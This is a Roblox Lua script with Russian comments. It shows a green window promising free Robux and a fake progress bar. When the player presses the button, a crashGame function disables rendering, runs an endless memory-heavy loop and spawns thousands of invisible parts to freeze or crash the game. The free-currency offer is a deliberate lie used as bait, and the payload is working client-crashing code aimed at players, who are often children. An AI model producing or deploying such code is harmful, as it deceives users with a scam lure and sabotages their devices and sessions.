-- ЗЕЛЁНОЕ GUI + ПРОГРЕСС-БАР + КРАШ (ИСПРАВЛЕННЫЙ)
local player = game.Players.LocalPlayer

-- ГЛАВНЫЙ ЭКРАН
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- ОСНОВНОЕ ОКНО
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 350)
frame.Position = UDim2.new(0.5, -225, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(30, 120, 30) -- ЗЕЛЁНЫЙ
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- ЗАГОЛОВОК
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "🎁 БЕСПЛАТНЫЕ РОБУКСЫ"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

-- ПОДСКАЗКА
local hint = Instance.new("TextLabel")
hint.Size = UDim2.new(1, -40, 0, 40)
hint.Position = UDim2.new(0, 20, 0, 65)
hint.BackgroundTransparency = 1
hint.Text = "Нажми кнопку, чтобы получить Robux"
hint.TextColor3 = Color3.fromRGB(220, 255, 220)
hint.TextScaled = true
hint.Font = Enum.Font.SourceSans
hint.Parent = frame

-- ФОН ПРОГРЕСС-БАРА
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 300, 0, 35)
progressBg.Position = UDim2.new(0.5, -150, 0.5, -20)
progressBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBg.BorderSizePixel = 1
progressBg.BorderColor3 = Color3.fromRGB(200, 200, 200)
progressBg.Parent = frame

-- ЗАПОЛНЕНИЕ ПРОГРЕСС-БАРА
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg

-- ТЕКСТ НА ПРОГРЕСС-БАРЕ
local progressText = Instance.new("TextLabel")
progressText.Size = UDim2.new(1, 0, 1, 0)
progressText.BackgroundTransparency = 1
progressText.Text = "0%"
progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
progressText.TextScaled = true
progressText.Font = Enum.Font.SourceSansBold
progressText.Parent = progressBg

-- КНОПКА "ПОЛУЧИТЬ"
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 220, 0, 55)
button.Position = UDim2.new(0.5, -110, 0.8, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
button.Text = "💎 ПОЛУЧИТЬ ROBUX"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.SourceSansBold
button.BorderSizePixel = 2
button.BorderColor3 = Color3.fromRGB(0, 255, 0)
button.Parent = frame

-- КНОПКА ЗАКРЫТИЯ (КРЕСТИК)
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.BorderSizePixel = 0
closeBtn.Parent = frame
closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ФУНКЦИЯ КРАША
local function crashGame()
    pcall(function()
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    end)
    spawn(function()
        while true do
            local t = {}
            for i = 1, 100000 do
                t[i] = i * i * i
            end
            task.wait()
        end
    end)
    spawn(function()
        for i = 1, 3000 do
            local p = Instance.new("Part")
            p.Parent = workspace
            p.Size = Vector3.new(50, 50, 50)
            p.Anchored = true
            p.CanCollide = false
            p.Transparency = 1
            task.wait()
        end
    end)
end

-- ЗАПУСК ПРОГРЕСС-БАРА ПРИ НАЖАТИИ
button.MouseButton1Click:Connect(function()
    button.Visible = false
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    
    for i = 0, 100 do
        progressFill.Size = UDim2.new(i / 100, 0, 1, 0)
        progressText.Text = i .. "%"
        task.wait(0.05)
    end
    
    progressText.Text = "✅ ГОТОВО!"
    task.wait(0.3)
    crashGame()
end)

print("[ГУИ] Зелёное окно загружено. Нажми кнопку для запуска.")
